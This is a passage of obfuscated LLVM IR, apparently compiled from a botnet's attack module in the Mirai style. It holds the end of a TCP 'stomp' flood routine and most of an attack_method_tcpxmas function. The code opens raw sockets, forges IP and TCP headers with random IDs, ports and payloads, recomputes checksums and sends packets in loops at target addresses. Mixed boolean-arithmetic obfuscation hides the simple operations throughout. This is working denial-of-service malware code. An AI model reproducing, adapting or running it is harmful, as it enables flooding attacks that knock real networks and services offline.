  %562 = and i16 %555, 1
  %563 = shl i16 %561, 11
  %564 = xor i16 %558, -1
  %565 = xor i16 -2049, -1
  %566 = xor i16 -19147, -1
  %567 = or i16 %564, %565
  %568 = or i16 -19147, %566
  %569 = xor i16 %567, -1
  %570 = and i16 %569, %568
  %571 = and i16 %558, -2049
  %572 = and i16 %570, %563
  %573 = xor i16 %570, %563
  %574 = or i16 %572, %573
  %575 = or i16 %570, %563
  store i16 %574, i16* %557, align 4
  %576 = load i8, i8* %21, align 1
  %577 = sext i8 %576 to i16
  %578 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 4
  %580 = load i16, i16* %579, align 4
  %581 = xor i16 %577, -1
  %582 = xor i16 1, -1
  %583 = xor i16 22932, -1
  %584 = or i16 %581, %582
  %585 = or i16 22932, %583
  %586 = xor i16 %584, -1
  %587 = and i16 %586, %585
  %588 = and i16 %577, 1
  %589 = shl i16 %587, 10
  %590 = xor i16 -1025, -1
  %591 = xor i16 %580, %590
  %592 = and i16 %591, %580
  %593 = and i16 %580, -1025
  %594 = xor i16 %592, -1
  %595 = xor i16 %589, -1
  %596 = xor i16 -6359, -1
  %597 = and i16 %594, -6359
  %598 = and i16 %592, %596
  %599 = and i16 %595, -6359
  %600 = and i16 %589, %596
  %601 = or i16 %597, %598
  %602 = or i16 %599, %600
  %603 = xor i16 %601, %602
  %604 = or i16 %594, %595
  %605 = xor i16 %604, -1
  %606 = or i16 -6359, %596
  %607 = and i16 %605, %606
  %608 = or i16 %603, %607
  %609 = or i16 %592, %589
  store i16 %608, i16* %579, align 4
  %610 = load i8, i8* %22, align 1
  %611 = sext i8 %610 to i16
  %612 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 4
  %614 = load i16, i16* %613, align 4
  %615 = xor i16 1, -1
  %616 = xor i16 %611, %615
  %617 = and i16 %616, %611
  %618 = and i16 %611, 1
  %619 = shl i16 %617, 9
  %620 = xor i16 %614, -1
  %621 = xor i16 -513, -1
  %622 = xor i16 -24633, -1
  %623 = or i16 %620, %621
  %624 = or i16 -24633, %622
  %625 = xor i16 %623, -1
  %626 = and i16 %625, %624
  %627 = and i16 %614, -513
  %628 = and i16 %626, %619
  %629 = xor i16 %626, %619
  %630 = or i16 %628, %629
  %631 = or i16 %626, %619
  store i16 %630, i16* %613, align 4
  %632 = load i8, i8* %23, align 1
  %633 = sext i8 %632 to i16
  %634 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %635 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %634, i32 0, i32 4
  %636 = load i16, i16* %635, align 4
  %637 = xor i16 %633, -1
  %638 = xor i16 1, -1
  %639 = xor i16 748, -1
  %640 = or i16 %637, %638
  %641 = or i16 748, %639
  %642 = xor i16 %640, -1
  %643 = and i16 %642, %641
  %644 = and i16 %633, 1
  %645 = shl i16 %643, 8
  %646 = xor i16 %636, -1
  %647 = xor i16 -257, -1
  %648 = xor i16 -14735, -1
  %649 = or i16 %646, %647
  %650 = or i16 -14735, %648
  %651 = xor i16 %649, -1
  %652 = and i16 %651, %650
  %653 = and i16 %636, -257
  %654 = and i16 %652, %645
  %655 = xor i16 %652, %645
  %656 = or i16 %654, %655
  %657 = or i16 %652, %645
  store i16 %656, i16* %635, align 4
  %658 = load i8*, i8** %38, align 8
  %659 = load i32, i32* %24, align 4
  call void @rand_str(i8* %658, i32 %659)
  br label %707

; <label>:660:                                    ; preds = %251, %240
  %661 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %662 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %661, i32 0, i32 4
  %663 = load i16, i16* %662, align 4
  %664 = lshr i16 %663, 8
  %665 = xor i16 %664, -1
  %666 = xor i16 1, -1
  %667 = xor i16 15222, -1
  %668 = or i16 %665, %666
  %669 = or i16 15222, %667
  %670 = xor i16 %668, -1
  %671 = and i16 %670, %669
  %672 = and i16 %664, 1
  %673 = zext i16 %671 to i32
  %674 = icmp ne i32 %673, 0
  br i1 %674, label %690, label %675

; <label>:675:                                    ; preds = %660
  %676 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %677 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %676, i32 0, i32 4
  %678 = load i16, i16* %677, align 4
  %679 = lshr i16 %678, 10
  %680 = xor i16 %679, -1
  %681 = xor i16 1, -1
  %682 = xor i16 3492, -1
  %683 = or i16 %680, %681
  %684 = or i16 3492, %682
  %685 = xor i16 %683, -1
  %686 = and i16 %685, %684
  %687 = and i16 %679, 1
  %688 = zext i16 %686 to i32
  %689 = icmp ne i32 %688, 0
  br i1 %689, label %690, label %693

; <label>:690:                                    ; preds = %675, %660
  %691 = load i32, i32* %26, align 4
  %692 = call i32 @close(i32 %691)
  br label %121

; <label>:693:                                    ; preds = %675
  br label %694

; <label>:694:                                    ; preds = %693
  br label %695

; <label>:695:                                    ; preds = %694, %228
  br label %696

; <label>:696:                                    ; preds = %695, %224, %216
  %697 = call i64 @time(i64* null) #6
  %698 = load i64, i64* %31, align 8
  %699 = sub i64 0, %698
  %700 = add i64 %697, %699
  %701 = sub nsw i64 %697, %698
  %702 = icmp sgt i64 %700, 10
  br i1 %702, label %703, label %706

; <label>:703:                                    ; preds = %696
  %704 = load i32, i32* %26, align 4
  %705 = call i32 @close(i32 %704)
  br label %121

; <label>:706:                                    ; preds = %696
  br label %204

; <label>:707:                                    ; preds = %379
  br label %708

; <label>:708:                                    ; preds = %707, %124
  %709 = load i32, i32* %9, align 4
  %710 = add i32 %709, 1983390327
  %711 = add i32 %710, 1
  %712 = sub i32 %711, 1983390327
  %713 = add nsw i32 %709, 1
  store i32 %712, i32* %9, align 4
  br label %115

; <label>:714:                                    ; preds = %115
  br label %715

; <label>:715:                                    ; preds = %848, %714
  store i32 0, i32* %9, align 4
  br label %716

; <label>:716:                                    ; preds = %842, %715
  %717 = load i32, i32* %9, align 4
  %718 = load i8, i8* %5, align 1
  %719 = zext i8 %718 to i32
  %720 = icmp slt i32 %717, %719
  br i1 %720, label %721, label %848

; <label>:721:                                    ; preds = %716
  %722 = load i8**, i8*** %12, align 8
  %723 = load i32, i32* %9, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds i8*, i8** %722, i64 %724
  %726 = load i8*, i8** %725, align 8
  store i8* %726, i8** %39, align 8
  %727 = load i8*, i8** %39, align 8
  %728 = bitcast i8* %727 to %struct.iphdr*
  store %struct.iphdr* %728, %struct.iphdr** %40, align 8
  %729 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %730 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %729, i64 1
  %731 = bitcast %struct.iphdr* %730 to %struct.tcphdr*
  store %struct.tcphdr* %731, %struct.tcphdr** %41, align 8
  %732 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %733 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %732, i64 1
  %734 = bitcast %struct.tcphdr* %733 to i8*
  store i8* %734, i8** %42, align 8
  %735 = load i16, i16* %14, align 2
  %736 = zext i16 %735 to i32
  %737 = icmp eq i32 %736, 65535
  br i1 %737, label %738, label %751

; <label>:738:                                    ; preds = %721
  %739 = call i32 @rand_next()
  %740 = xor i32 %739, -1
  %741 = xor i32 65535, -1
  %742 = xor i32 -1466104371, -1
  %743 = or i32 %740, %741
  %744 = or i32 -1466104371, %742
  %745 = xor i32 %743, -1
  %746 = and i32 %745, %744
  %747 = and i32 %739, 65535
  %748 = trunc i32 %746 to i16
  %749 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %750 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %749, i32 0, i32 3
  store i16 %748, i16* %750, align 4
  br label %751

; <label>:751:                                    ; preds = %738, %721
  %752 = load i8, i8* %25, align 1
  %753 = icmp ne i8 %752, 0
  br i1 %753, label %754, label %757

; <label>:754:                                    ; preds = %751
  %755 = load i8*, i8** %42, align 8
  %756 = load i32, i32* %24, align 4
  call void @rand_str(i8* %755, i32 %756)
  br label %757

; <label>:757:                                    ; preds = %754, %751
  %758 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %759 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %758, i32 0, i32 7
  store i16 0, i16* %759, align 2
  %760 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %761 = bitcast %struct.iphdr* %760 to i16*
  %762 = call zeroext i16 @checksum_generic(i16* %761, i32 20)
  %763 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %764 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %763, i32 0, i32 7
  store i16 %762, i16* %764, align 2
  %765 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %766 = load i32, i32* %9, align 4
  %767 = sext i32 %766 to i64
  %768 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %765, i64 %767
  %769 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %768, i32 0, i32 1
  %770 = load i32, i32* %769, align 4
  %771 = add i32 %770, 720040056
  %772 = add i32 %771, 1
  %773 = sub i32 %772, 720040056
  %774 = add i32 %770, 1
  store i32 %773, i32* %769, align 4
  %775 = trunc i32 %770 to i16
  %776 = call zeroext i16 @htons(i16 zeroext %775) #7
  %777 = zext i16 %776 to i32
  %778 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %779 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %778, i32 0, i32 2
  store i32 %777, i32* %779, align 4
  %780 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %781 = load i32, i32* %9, align 4
  %782 = sext i32 %781 to i64
  %783 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %780, i64 %782
  %784 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %783, i32 0, i32 2
  %785 = load i32, i32* %784, align 4
  %786 = trunc i32 %785 to i16
  %787 = call zeroext i16 @htons(i16 zeroext %786) #7
  %788 = zext i16 %787 to i32
  %789 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %790 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %789, i32 0, i32 3
  store i32 %788, i32* %790, align 4
  %791 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %792 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %791, i32 0, i32 6
  store i16 0, i16* %792, align 4
  %793 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %794 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %795 = bitcast %struct.tcphdr* %794 to i8*
  %796 = load i32, i32* %24, align 4
  %797 = sext i32 %796 to i64
  %798 = sub i64 0, 20
  %799 = sub i64 0, %797
  %800 = add i64 %798, %799
  %801 = sub i64 0, %800
  %802 = add i64 20, %797
  %803 = trunc i64 %801 to i16
  %804 = call zeroext i16 @htons(i16 zeroext %803) #7
  %805 = load i32, i32* %24, align 4
  %806 = sext i32 %805 to i64
  %807 = add i64 20, -479372702046301708
  %808 = add i64 %807, %806
  %809 = sub i64 %808, -479372702046301708
  %810 = add i64 20, %806
  %811 = trunc i64 %809 to i32
  %812 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %793, i8* %795, i16 zeroext %804, i32 %811)
  %813 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %814 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %813, i32 0, i32 6
  store i16 %812, i16* %814, align 4
  %815 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %816 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %815, i32 0, i32 1
  %817 = load i16, i16* %816, align 2
  %818 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %819 = load i32, i32* %9, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %818, i64 %820
  %822 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %821, i32 0, i32 0
  %823 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %822, i32 0, i32 1
  store i16 %817, i16* %823, align 2
  %824 = load i32, i32* %10, align 4
  %825 = load i8*, i8** %39, align 8
  %826 = load i32, i32* %24, align 4
  %827 = sext i32 %826 to i64
  %828 = add i64 40, -525570659279044078
  %829 = add i64 %828, %827
  %830 = sub i64 %829, -525570659279044078
  %831 = add i64 40, %827
  %832 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %833 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %834 = load i32, i32* %9, align 4
  %835 = sext i32 %834 to i64
  %836 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %833, i64 %835
  %837 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %836, i32 0, i32 0
  %838 = bitcast %struct.sockaddr_in* %837 to %struct.sockaddr*
  store %struct.sockaddr* %838, %struct.sockaddr** %832, align 8
  %839 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %840 = load %struct.sockaddr*, %struct.sockaddr** %839, align 8
  %841 = call i64 @sendto(i32 %824, i8* %825, i64 %830, i32 16384, %struct.sockaddr* %840, i32 16)
  br label %842

; <label>:842:                                    ; preds = %757
  %843 = load i32, i32* %9, align 4
  %844 = sub i32 %843, -683112636
  %845 = add i32 %844, 1
  %846 = add i32 %845, -683112636
  %847 = add nsw i32 %843, 1
  store i32 %846, i32* %9, align 4
  br label %716

; <label>:848:                                    ; preds = %716
  br label %715

; <label>:849:                                    ; preds = %215, %111, %105
  ret void
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %902

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %902

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %765, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %771

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %760, %746, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %765

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = xor i32 %128, -1
  %130 = xor i32 2048, -1
  %131 = xor i32 683815142, -1
  %132 = and i32 %129, 683815142
  %133 = and i32 %128, %131
  %134 = and i32 %130, 683815142
  %135 = and i32 2048, %131
  %136 = or i32 %132, %133
  %137 = or i32 %134, %135
  %138 = xor i32 %136, %137
  %139 = or i32 %129, %130
  %140 = xor i32 %139, -1
  %141 = or i32 683815142, %131
  %142 = and i32 %140, %141
  %143 = or i32 %138, %142
  %144 = or i32 %128, 2048
  %145 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %143)
  %146 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %146, align 4
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 4
  %153 = zext i8 %152 to i32
  %154 = icmp slt i32 %153, 32
  br i1 %154, label %155, label %179

; <label>:155:                                    ; preds = %125
  %156 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i64 %158
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i32 0, i32 1
  %161 = load i32, i32* %160, align 4
  %162 = call i32 @ntohl(i32 %161) #7
  %163 = call i32 @rand_next()
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 2
  %169 = load i8, i8* %168, align 4
  %170 = zext i8 %169 to i32
  %171 = lshr i32 %163, %170
  %172 = sub i32 %162, -1665359193
  %173 = add i32 %172, %171
  %174 = add i32 %173, -1665359193
  %175 = add i32 %162, %171
  %176 = call i32 @htonl(i32 %174) #7
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %178 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %177, i32 0, i32 0
  store i32 %176, i32* %178, align 4
  br label %188

; <label>:179:                                    ; preds = %125
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %187 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %186, i32 0, i32 0
  store i32 %185, i32* %187, align 4
  br label %188

; <label>:188:                                    ; preds = %179, %155
  %189 = load i16, i16* %17, align 2
  %190 = zext i16 %189 to i32
  %191 = icmp eq i32 %190, 65535
  br i1 %191, label %192, label %204

; <label>:192:                                    ; preds = %188
  %193 = call i32 @rand_next()
  %194 = xor i32 %193, -1
  %195 = xor i32 65535, -1
  %196 = xor i32 1056438389, -1
  %197 = or i32 %194, %195
  %198 = or i32 1056438389, %196
  %199 = xor i32 %197, -1
  %200 = and i32 %199, %198
  %201 = and i32 %193, 65535
  %202 = trunc i32 %200 to i16
  %203 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %202, i16* %203, align 2
  br label %208

; <label>:204:                                    ; preds = %188
  %205 = load i16, i16* %17, align 2
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %206, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %204, %192
  %209 = load i32, i32* %26, align 4
  %210 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %211 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %211, %struct.sockaddr** %210, align 8
  %212 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %213 = load %struct.sockaddr*, %struct.sockaddr** %212, align 8
  %214 = call i32 @connect(i32 %209, %struct.sockaddr* %213, i32 16)
  %215 = call i64 @time(i64* null) #6
  store i64 %215, i64* %31, align 8
  br label %216

; <label>:216:                                    ; preds = %763, %208
  store i32 16, i32* %29, align 4
  %217 = load i32, i32* %10, align 4
  %218 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %219 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %220 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %220, %struct.sockaddr** %219, align 8
  %221 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %222 = load %struct.sockaddr*, %struct.sockaddr** %221, align 8
  %223 = call i64 @recvfrom(i32 %217, i8* %218, i64 256, i32 16384, %struct.sockaddr* %222, i32* %29)
  %224 = trunc i64 %223 to i32
  store i32 %224, i32* %33, align 4
  %225 = load i32, i32* %33, align 4
  %226 = icmp eq i32 %225, -1
  br i1 %226, label %227, label %228

; <label>:227:                                    ; preds = %216
  br label %902

; <label>:228:                                    ; preds = %216
  %229 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %230 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %229, i32 0, i32 0
  %231 = load i32, i32* %230, align 4
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %233 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %232, i32 0, i32 0
  %234 = load i32, i32* %233, align 4
  %235 = icmp eq i32 %231, %234
  br i1 %235, label %236, label %752

; <label>:236:                                    ; preds = %228
  %237 = load i32, i32* %33, align 4
  %238 = sext i32 %237 to i64
  %239 = icmp ugt i64 %238, 40
  br i1 %239, label %240, label %752

; <label>:240:                                    ; preds = %236
  %241 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %242 = getelementptr inbounds i8, i8* %241, i64 20
  %243 = bitcast i8* %242 to %struct.tcphdr*
  store %struct.tcphdr* %243, %struct.tcphdr** %35, align 8
  %244 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = load i16, i16* %245, align 4
  %247 = zext i16 %246 to i32
  %248 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %249 = load i16, i16* %248, align 2
  %250 = zext i16 %249 to i32
  %251 = icmp eq i32 %247, %250
  br i1 %251, label %252, label %751

; <label>:252:                                    ; preds = %240
  %253 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 4
  %255 = load i16, i16* %254, align 4
  %256 = lshr i16 %255, 9
  %257 = xor i16 1, -1
  %258 = xor i16 %256, %257
  %259 = and i16 %258, %256
  %260 = and i16 %256, 1
  %261 = zext i16 %259 to i32
  %262 = icmp ne i32 %261, 0
  br i1 %262, label %263, label %720

; <label>:263:                                    ; preds = %252
  %264 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 4
  %266 = load i16, i16* %265, align 4
  %267 = lshr i16 %266, 12
  %268 = xor i16 %267, -1
  %269 = xor i16 1, -1
  %270 = xor i16 -2525, -1
  %271 = or i16 %268, %269
  %272 = or i16 -2525, %270
  %273 = xor i16 %271, -1
  %274 = and i16 %273, %272
  %275 = and i16 %267, 1
  %276 = zext i16 %274 to i32
  %277 = icmp ne i32 %276, 0
  br i1 %277, label %278, label %720

